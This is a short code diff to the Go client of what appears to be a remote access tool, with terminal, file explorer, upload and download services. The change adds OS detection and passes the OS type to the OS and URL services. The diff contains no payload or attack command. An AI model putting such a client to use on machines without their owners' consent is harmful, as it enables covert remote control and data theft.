@@ -13,6 +13,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
 	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/utilities/system"
 	"net/http"
 )
 
@@ -22,8 +23,8 @@ type App struct {
 
 func NewApp(httpClient *http.Client, configuration *environment.Configuration) *App {
 	clientGateway := client.NewGateway(configuration, httpClient)
-
 	terminalService := terminal.NewTerminalService()
+	osType := system.DetectOS()
 
 	return &App{
 		Handler: handler.NewHandler(configuration, clientGateway, &services.Services{
@@ -33,8 +34,8 @@ func NewApp(httpClient *http.Client, configuration *environment.Configuration) *
 			Download:    download.NewDownloadService(configuration, clientGateway),
 			Upload:      upload.NewUploadService(configuration, httpClient),
 			Explorer:    explorer.NewExplorerService(),
-			OS:          os.NewOperatingSystemService(configuration, terminalService),
-			URL:         url.NewURLService(terminalService),
+			OS:          os.NewOperatingSystemService(configuration, terminalService, osType),
+			URL:         url.NewURLService(terminalService, osType),
 		}),
 	}
 }
